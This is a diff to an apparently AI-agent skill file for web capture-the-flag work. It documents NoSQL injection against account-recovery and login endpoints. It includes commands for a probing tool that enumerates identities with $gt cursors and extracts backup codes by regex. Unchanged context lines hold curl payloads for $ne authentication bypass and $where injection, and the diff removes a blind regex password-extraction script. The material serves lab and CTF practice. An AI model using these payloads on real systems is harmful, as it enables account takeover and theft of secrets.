@@ -66,6 +66,50 @@ Two more traps on numeric/`LIMIT` params:
 
 Trigger: `mongoose`/`mongodb` in `package.json`, or `pymongo`.
 
+Start with an action/search/recovery endpoint and an explicit field allowlist. Do not begin on
+login, registration, or password fields: a backend that passes operator objects into an
+unexpected password library can crash a fragile lab. `nosqlquick.py` refuses those surfaces
+unless `--dangerous-auth` is supplied.
+
+```bash
+python3 ~/.claude/skills/web-ctf/scripts/nosqlquick.py \
+  --url "<target>/api/account/recover" \
+  --field email --field backupCode \
+  --baseline email=none@example.test --baseline backupCode=invalid \
+  --success-json status=verified --probe --map-query-shape
+```
+
+The probe sends a scalar invalid baseline, one-field `$ne` requests, and then all required fields
+as operators together. If the paired request succeeds while either single request fails, those
+single-field negatives were blocked by another validation guard and are reported as **unknown**,
+not safe. `--map-query-shape` adds an impossible extra scalar field: an identical response is
+evidence that the server selects fixed query fields; a changed response suggests full-body
+binding or validation.
+
+Enumerate a returned identity with a monotonic `$gt` cursor:
+
+```bash
+python3 ~/.claude/skills/web-ctf/scripts/nosqlquick.py \
+  --url "<target>/api/account/recover" --field email --field backupCode \
+  --enumerate email --identity-json email --success-json status=verified
+```
+
+Once one record is locked exactly, extract another field without assuming the placeholder's
+alphabet or length. The extractor defaults to printable ASCII, binary-searches regex character
+classes, and checks exact `$eq` after every prefix:
+
+```bash
+python3 ~/.claude/skills/web-ctf/scripts/nosqlquick.py \
+  --url "<target>/api/account/recover" --field email --field backupCode \
+  --lock email=user@example.test --extract backupCode \
+  --success-json status=verified
+```
+
+Every probe is saved to `nosqlquick_out/probes.jsonl`. A `429` exits inconclusive, and a gateway
+failure trips the circuit breaker and records the last payload instead of continuing mutations.
+
+### Dangerous auth probes — explicit opt-in only
+
 ```bash
 # auth bypass
 curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
@@ -76,23 +120,6 @@ curl -si -X POST <target>/api/login -d 'username=admin&password[$ne]=x'
 
 # $where JS execution (older MongoDB)
 curl -si "<target>/api/users?filter[\$where]=sleep(2000)" $AUTH_HEADER
-```
-
-Blind extraction by regex prefix:
-```bash
-python3 << 'EOF'
-import requests, string
-target = "<target>/api/login"
-charset = string.ascii_letters + string.digits + "_{}-"
-known = ""
-while True:
-    for c in charset:
-        r = requests.post(target, json={"username":"admin","password":{"$regex":f"^{known}{c}"}}, verify=False)
-        if r.status_code == 200 and "wrong" not in r.text.lower() and "invalid" not in r.text.lower():
-            known += c; print(f"[+] {known}"); break
-    else:
-        print(f"[done] {known}"); break
-EOF
 ```
 
 ### Hidden nested filter params
